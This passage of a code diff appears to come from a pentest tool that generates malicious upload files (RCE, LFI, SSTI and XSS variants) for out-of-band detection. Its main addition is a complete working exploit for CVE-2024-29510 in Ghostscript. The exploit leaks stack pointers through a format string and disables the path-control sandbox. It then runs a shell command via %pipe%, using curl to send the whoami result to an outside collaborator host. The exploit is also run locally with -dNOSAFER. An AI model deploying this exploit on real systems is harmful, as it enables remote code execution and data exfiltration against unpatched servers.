 %%EOF'''
-    with open(info_dir / "info5_info_directory.pdf", 'wb') as f:
-        f.write(pdf_info5_info_directory.encode())
+        with open(info_dir / "info5_info_directory.pdf", 'wb') as f:
+            f.write(pdf_info5_info_directory.encode())
     
     pdf_rce3_openDoc = f'''%PDF-1.4
 1 0 obj
@@ -2368,8 +2450,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(rce_dir / "rce3_openDoc.pdf", 'wb') as f:
-        f.write(pdf_rce3_openDoc.encode())
+    if should_generate_type('rce'):
+        with open(rce_dir / "rce3_openDoc.pdf", 'wb') as f:
+            f.write(pdf_rce3_openDoc.encode())
     
     pdf_rce4_uri_start = f'''%PDF-1.4
 1 0 obj
@@ -2414,8 +2497,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(rce_dir / "rce4_uri_start.pdf", 'wb') as f:
-        f.write(pdf_rce4_uri_start.encode())
+    if should_generate_type('rce'):
+        with open(rce_dir / "rce4_uri_start.pdf", 'wb') as f:
+            f.write(pdf_rce4_uri_start.encode())
     
     pdf_rce5_launchURL = f'''%PDF-1.4
 1 0 obj
@@ -2459,8 +2543,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(rce_dir / "rce5_launchURL.pdf", 'wb') as f:
-        f.write(pdf_rce5_launchURL.encode())
+    if should_generate_type('rce'):
+        with open(rce_dir / "rce5_launchURL.pdf", 'wb') as f:
+            f.write(pdf_rce5_launchURL.encode())
     
     pdf_rce6_launchURL_file = f'''%PDF-1.4
 1 0 obj
@@ -2504,8 +2589,318 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(rce_dir / "rce6_launchURL_file.pdf", 'wb') as f:
-        f.write(pdf_rce6_launchURL_file.encode())
+    if should_generate_type('rce'):
+        with open(rce_dir / "rce6_launchURL_file.pdf", 'wb') as f:
+            f.write(pdf_rce6_launchURL_file.encode())
+    
+    # RCE: rce7_cve_2024_29510.eps - CVE-2024-29510 Ghostscript RCE via uniprint format string
+    # BACKEND: all (Ghostscript)
+    # DETECTION: Out-of-band via Burp Collaborator
+    # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-cve-2024-29510
+    # Technique: Exploit complet CVE-2024-29510 avec leak stack, overwrite path_control_active, puis RCE via %pipe%
+    # Source: https://raw.githubusercontent.com/codean-labs/pocs/refs/heads/main/CVE-2024-29510%20(Ghostscript)/CVE-2024-29510_poc_calc.eps
+    cve_2024_29510_eps = f'''%!PS-Adobe-3.0 EPSF-3.0
+%%Pages: 1
+%%BoundingBox:   36   36  576  756
+%%LanguageLevel: 1
+%%EndComments
+%%BeginProlog
+%%EndProlog
+
+
+% ====== Configuration ======
+
+% Offset of `gp_file *out` on the stack
+/IdxOutPtr 5 def
+
+
+% ====== General Postscript utility functions ======
+
+% from: https://github.com/scriptituk/pslutils/blob/master/string.ps
+/cat {{
+	exch
+	dup length 2 index length add string
+	dup dup 5 2 roll
+	copy length exch putinterval
+}} bind def
+
+% from: https://rosettacode.org/wiki/Repeat_a_string#PostScript
+/times {{
+  dup length dup    % rcount ostring olength olength
+  4 3 roll          % ostring olength olength rcount
+  mul dup string    % ostring olength flength fstring
+  4 1 roll          % fstring ostring olength flength
+  1 sub 0 3 1 roll  % fstring ostring 0 olength flength_minus_one 
+  {{                 % fstring ostring iter
+    1 index 3 index % fstring ostring iter ostring fstring
+    3 1 roll        % fstring ostring fstring iter ostring
+    putinterval     % fstring ostring
+  }} for
+  pop               % fstring
+}} bind def
+
+% Printing helpers
+/println {{ print (\\012) print }} bind def
+/printnumln {{ =string cvs println }} bind def
+
+% ====== Start of exploit helper code ======
+
+% Make a new tempfile but only save its path. This gives us a file path to read/write 
+% which will exist as long as this script runs. We don't actually use the file object
+% (hence `pop`) because we're passing the path to uniprint and reopening it ourselves.
+/PathTempFile () (w+) .tempfile pop def
+
+
+% Convert hex string "4142DEADBEEF" to padded little-endian byte string <EFBEADDE42410000>
+% <HexStr> str_ptr_to_le_bytes <ByteStringLE>
+/str_ptr_to_le_bytes {{
+	% Convert hex string argument to Postscript string
+	% using <DEADBEEF> notation
+	/ArgBytes exch (<) exch (>) cat cat token pop exch pop def
+
+	% Prepare resulting string (`string` fills with zeros)
+	/Res 8 string def
+
+	% For every byte in the input
+	0 1 ArgBytes length 1 sub {{
+		/i exch def
+
+		% put byte at index (len(ArgBytes) - 1 - i)
+		Res ArgBytes length 1 sub i sub ArgBytes i get put
+	}} for
+
+	Res % return
+}} bind def
+
+
+% <StackString> <FmtString> do_uniprint <LeakedData>
+/do_uniprint {{
+	/FmtString exch def
+	/StackString exch def
+
+	% Select uniprint device with our payload
+	<<
+		/OutputFile PathTempFile
+		/OutputDevice /uniprint
+		/upColorModel /DeviceCMYKgenerate
+		/upRendering /FSCMYK32
+		/upOutputFormat /Pcl
+		/upOutputWidth 99999
+		/upWriteComponentCommands {{(x)(x)(x)(x)}} % This is required, just put bogus strings
+		/upYMoveCommand FmtString
+	>>
+	setpagedevice
+	
+	% Manipulate the interpreter to put a recognizable piece of data on the stack
+	(%%__) StackString cat .runstring
+
+	% Produce a page with some content to trigger uniprint logic
+	newpath 1 1 moveto 1 2 lineto 1 setlinewidth stroke
+	showpage
+
+	% Read back the written data
+	/InFile PathTempFile (r) file def
+	/LeakedData InFile 4096 string readstring pop def
+	InFile closefile
+
+	LeakedData % return
+}} bind def
+
+
+% get_index_of_controllable_stack <Idx>
+/get_index_of_controllable_stack {{
+	% A recognizable token on the stack to search for
+	/SearchToken (ABABABAB) def
+
+	% Construct "1:%lx,2:%lx,3:%lx,...,400:%lx,"
+	/FmtString 0 string 1 1 400 {{ 3 string cvs (:%lx,) cat cat }} for def
+
+	SearchToken FmtString do_uniprint
+
+	% Search for ABABABAB => 4241424142414241 (assume LE)
+	(4241424142414241) search {{
+		exch pop
+		exch pop
+		% <pre> is left
+
+		% Search for latest comma in <pre> to get e.g. `123:` as <post>
+		(,) rsearch pop pop pop
+
+		% Search for colon and use <pre> to get `123`
+		(:) search pop exch pop exch pop
+
+		% return as int
+		cvi
+	}} {{
+		(Could not find our data on the stack.. exiting) println
+		quit
+	}} ifelse
+}} bind def
+
+
+% <StackIdx> <AddrHex> write_to
+/write_to {{
+	/AddrHex exch str_ptr_to_le_bytes def % address to write to
+	/StackIdx exch def % stack idx to use
+
+	/FmtString StackIdx 1 sub (%x) times (_%ln) cat def
+
+	AddrHex FmtString do_uniprint
+
+	pop % we don't care about formatted data
+}} bind def
+
+
+% <StackIdx> read_ptr_at <PtrHexStr>
+/read_ptr_at {{
+	/StackIdx exch def % stack idx to use
+
+	/FmtString StackIdx 1 sub (%x) times (__%lx__) cat def
+
+	() FmtString do_uniprint
+
+	(__) search pop pop pop (__) search pop exch pop exch pop
+}} bind def
+
+
+% num_bytes <= 9
+% <StackIdx> <PtrHex> <NumBytes> read_dereferenced_bytes_at <ResultAsMultipliedInt>
+/read_dereferenced_bytes_at {{
+	/NumBytes exch def
+	/PtrHex exch def
+	/PtrOct PtrHex str_ptr_to_le_bytes def % address to read from
+	/StackIdx exch def % stack idx to use
+
+	/FmtString StackIdx 1 sub (%x) times (__%.) NumBytes 1 string cvs cat (s__) cat cat def
+
+	PtrOct FmtString do_uniprint
+
+	/Data exch (__) search pop pop pop (__) search pop exch pop exch pop def
+
+	% Check if we were able to read all bytes
+	Data length NumBytes eq {{
+		% Yes we did! So return the integer conversion of the bytes
+		0 % accumulator
+		NumBytes 1 sub -1 0 {{
+			exch % <i> <accum>
+			256 mul exch % <accum*256> <i>
+			Data exch get % <accum*256> <Data[i]>
+			add % <accum*256 + Data[i]>
+		}} for
+	}} {{
+		% We did not read all bytes, add a null byte and recurse on addr+1
+		StackIdx 1 PtrHex ptr_add_offset NumBytes 1 sub read_dereferenced_bytes_at
+		256 mul
+	}} ifelse
+}} bind def
+
+
+% <StackIdx> <AddrHex> read_dereferenced_ptr_at <PtrHexStr>
+/read_dereferenced_ptr_at {{
+	% Read 6 bytes
+	6 read_dereferenced_bytes_at
+
+	% Convert to hex string and return
+	16 12 string cvrs
+}} bind def
+
+
+% <Offset> <PtrHexStr> ptr_add_offset <PtrHexStr>
+/ptr_add_offset {{
+	/PtrHexStr exch def % hex string pointer
+	/Offset exch def % integer to add
+
+	/PtrNum (16#) PtrHexStr cat cvi def
+
+	% base 16, string length 12
+	PtrNum Offset add 16 12 string cvrs
+}} bind def
+
+
+() println
+
+% ====== Start of exploit logic ======
+
+
+% Find out the index of the controllable bytes
+% This is around the 200-300 range but differs per binary/version
+/IdxStackControllable get_index_of_controllable_stack def
+(Found controllable stack region at index: ) print IdxStackControllable printnumln
+
+% Exploit steps:
+% - `gp_file *out` is at stack index `IdxOutPtr`.
+%
+% - Controllable data is at index `IdxStackControllable`.
+%
+% - We want to find out the address of: 
+%       out->memory->gs_lib_ctx->core->path_control_active
+%   hence we need to dereference and add ofsets a few times
+%
+% - Once we have the address of `path_control_active`, we use
+%   our write primitive to write an integer to its address - 3
+%   such that the most significant bytes (zeros) of that integer
+%   overwrite `path_control_active`, setting it to 0.
+%
+% - Finally, with `path_control_active` disabled, we can use
+%   the built-in (normally sandboxed) `%pipe%` functionality to
+%   run shell commands
+
+
+/PtrOut IdxOutPtr read_ptr_at def
+
+(out: 0x) PtrOut cat println
+
+
+% memory is at offset 144 in out
+/PtrOutOffset 144 PtrOut ptr_add_offset def
+/PtrMem IdxStackControllable PtrOutOffset read_dereferenced_ptr_at def
+
+(out->mem: 0x) PtrMem cat println
+
+% gs_lib_ctx is at offset 208 in memory
+/PtrMemOffset 208 PtrMem ptr_add_offset def
+/PtrGsLibCtx IdxStackControllable PtrMemOffset read_dereferenced_ptr_at def
+
+(out->mem->gs_lib_ctx: 0x) PtrGsLibCtx cat println
+
+% core is at offset 8 in gs_lib_ctx
+/PtrGsLibCtxOffset 8 PtrGsLibCtx ptr_add_offset def
+/PtrCore IdxStackControllable PtrGsLibCtxOffset read_dereferenced_ptr_at def
+
+(out->mem->gs_lib_ctx->core: 0x) PtrCore cat println
+
+% path_control_active is at offset 156 in core
+/PtrPathControlActive 156 PtrCore ptr_add_offset def
+
+(out->mem->gs_lib_ctx->core->path_control_active: 0x) PtrPathControlActive cat println
+
+% Subtract a bit from the address to make sure we write a null over the field
+/PtrTarget -3 PtrPathControlActive ptr_add_offset def
+
+% And overwrite it!
+IdxStackControllable PtrTarget write_to
+
+
+% And now `path_control_active` == 0, so we can use %pipe%
+
+(%pipe%curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-cve-2024-29510) (r) file
+
+quit'''
+    
+    if should_generate_type('rce'):
+        eps_path = rce_dir / "rce7_cve_2024_29510.eps"
+        with open(eps_path, 'wb') as f:
+            f.write(cve_2024_29510_eps.encode())
+        
+        pdf_path = rce_dir / "rce7_cve_2024_29510.pdf"
+        try:
+            result = subprocess.run(['gs', '-dNOPAUSE', '-dBATCH', '-dNOSAFER', '-sDEVICE=pdfwrite', 
+                                   f'-sOutputFile={pdf_path}', str(eps_path)], 
+                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30, check=False)
+            if not pdf_path.exists() or pdf_path.stat().st_size < 100:
+                pdf_path = None
+        except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
+            pdf_path = None
     
     pdf_lfi2_uri_file = f'''%PDF-1.4
 1 0 obj
@@ -2550,8 +2945,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(lfi_dir / "lfi2_uri_file.pdf", 'wb') as f:
-        f.write(pdf_lfi2_uri_file.encode())
+    if should_generate_type('lfi'):
+        with open(lfi_dir / "lfi2_uri_file.pdf", 'wb') as f:
+            f.write(pdf_lfi2_uri_file.encode())
     
     pdf_master = f'''%PDF-1.4
 1 0 obj
@@ -2820,7 +3216,7 @@ startxref
 0
 %%EOF'''
     with open(output_dir / "master.pdf", 'wb') as f:
-        f.write(pdf_master.encode())
+            f.write(pdf_master.encode())
     
     pdf_master2_rce = f'''%PDF-1.4
 1 0 obj
@@ -2885,4 +3281,10 @@ startxref
 0
 %%EOF'''
     with open(output_dir / "master2_rce.pdf", 'wb') as f:
-        f.write(pdf_master2_rce.encode())
+            f.write(pdf_master2_rce.encode())
+    
+    if generate_ssti_filename_payloads and should_generate_type('ssti'):
+        generate_ssti_filename_payloads(output_dir, 'pdf', burp_collab, tech_filter)
+    
+    if generate_xss_filename_payloads and should_generate_type('xss'):
+        generate_xss_filename_payloads(output_dir, 'pdf', burp_collab, tech_filter)
